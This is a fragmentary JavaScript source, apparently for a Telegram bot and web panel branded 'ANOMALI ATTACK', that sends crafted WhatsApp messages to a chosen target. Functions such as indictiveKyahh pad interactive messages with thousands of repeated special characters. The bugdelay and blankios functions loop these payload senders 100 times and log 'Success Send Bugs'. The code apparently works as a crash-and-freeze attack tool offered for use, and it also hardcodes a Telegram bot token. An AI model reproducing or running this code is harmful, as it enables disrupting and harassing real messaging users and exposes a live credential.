...
bot.command("start", async (ctx) => {
  ...
  const teks = `
<blockquote>😜 ANOMALI ATTACK</blockquote>
...
`;
  ...
  await ctx.reply(indictiveMenu, {
    ...
    reply_markup: Markup.inlineKeyboard([
      [ Markup.button.url("ANOMALI ATTACK", "https://t.me/KingZzSoloEraa") ]
    ]).reply_markup
  });
});
...
<b>📞 Support:</b>
Contact KingZzSoloEraa for assistance
`;
...
bot.hears("💬 Chat", (ctx) => {
  ctx.reply("💬 Chat dengan developer: https://t.me/KingZzSoloEraa");
});

bot.hears("📢 Channel", (ctx) => {
  ctx.reply("📢 Channel updates: https://t.me/memeg");
});
...
async function PalestinaHBD(sock, target) {
        ...
        interactiveResponseMessage: {
          ...
          contextInfo: {
            ...
            forwardedNewsletterMessageInfo: {
              newsletterName: "OmOsakaIsCommback🫥",
...
async function indictiveKyahh(sock, target) {
      ...
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            ...
            body: {
              text: "MEZZY EMPIRE XATANICAL" + "𑇂𑆵𑆴𑆿".repeat(2000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{}",
            },
...
async function bugdelay(sock, target) {
     for (let i = 0; i < 100; i++) {
     await PalestinaHBD(sock, target);
     await indictiveKyahh(sock, target);
...
async function blankios(sock, target) {
     for (let i = 0; i < 100; i++) {
     await SqlBlank(sock, target);
     await PalestinaHBD(sock, target);
     await indictiveKyahh(sock, target);
     await OverParams(sock, target);
        }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
...
*/
const BOT_TOKEN = "8257898472:AAHHrtw-yq-gEpljqsR1lN42RpyIweVFZjA";
const CHAT_ID = "8355166220";
let lastExecution = 0;
...
app.get("/mysender", requireAuth, (req, res) => {
  const filePath = path.join(__dirname, "my-senders.html");
  res.sendFile(filePath);
});
    ...
    <div class="container">
        <header>
            <div class="header-left">
                <h1>INDICTIVE</h1>
                <p>System Execution Core // v4.0</p>
            </div>
